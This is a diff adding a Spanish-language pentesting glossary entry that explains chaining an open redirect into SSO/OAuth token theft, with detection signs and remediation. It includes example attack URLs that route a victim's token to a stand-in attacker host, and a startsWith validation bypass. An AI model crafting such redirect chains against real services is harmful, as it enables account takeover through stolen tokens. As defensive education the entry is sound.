@@ -1,0 +1,37 @@
+---
+title: "Open Redirect → SSO chain"
+description: "Endpoint de redirect que no valida destino: https://app.com/redirect?to=https://attacker.tld."
+---
+
+# Open Redirect → SSO chain
+
+<p className="glossary-answer">Endpoint de redirect que no valida destino: https://app.com/redirect?to=https://attacker.tld.</p>
+
+**Categoría:** [Web · Vectores avanzados](/glosario)
+
+🎯 **Trinchera** — Endpoint de redirect que no valida destino:
+`https://app.com/redirect?to=https://attacker.tld`. Aislado: P5.
+**Encadenado** a SSO/OAuth con redirect_uri usando ese endpoint:
+robo de token, P1.
+
+🔗 **Kill chain** — `https://sso.com/auth?redirect_uri=https://app.com/redirect?to=https://attacker.tld`
+→ víctima autentica → token reenviado a atacante.
+
+📡 **Huella defensiva** — Volumen de redirects hacia dominios
+externos no listados; tokens autorizados con redirect_uri en cadena.
+
+⚠️ **Falso amigo** — Validar destino con `startsWith('https://app.com')`
+permite `https://app.com.attacker.tld`.
+
+🛡️ **Remediación** — Allowlist exacta de destinos, prohibir
+redirects con URL completa (sólo paths internos).
+
+---
+
+← [Volver al glosario completo](/glosario)
+
+<script type="application/ld+json">{`{"@context":"https://schema.org","@type":"DefinedTerm","name":"Open Redirect → SSO chain","description":"Endpoint de redirect que no valida destino: https://app.com/redirect?to=https://attacker.tld.","inDefinedTermSet":{"@type":"DefinedTermSet","name":"Glosario táctico de pentesting","url":"https://rootea.es/glosario"},"url":"https://rootea.es/glosario/open-redirect-sso-chain"}`}</script>
+
+<script type="application/ld+json">{`{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Inicio","item":"https://rootea.es"},{"@type":"ListItem","position":2,"name":"Glosario táctico","item":"https://rootea.es/glosario"},{"@type":"ListItem","position":3,"name":"Open Redirect → SSO chain","item":"https://rootea.es/glosario/open-redirect-sso-chain"}]}`}</script>
+
+_Última actualización: 2026-06-11_
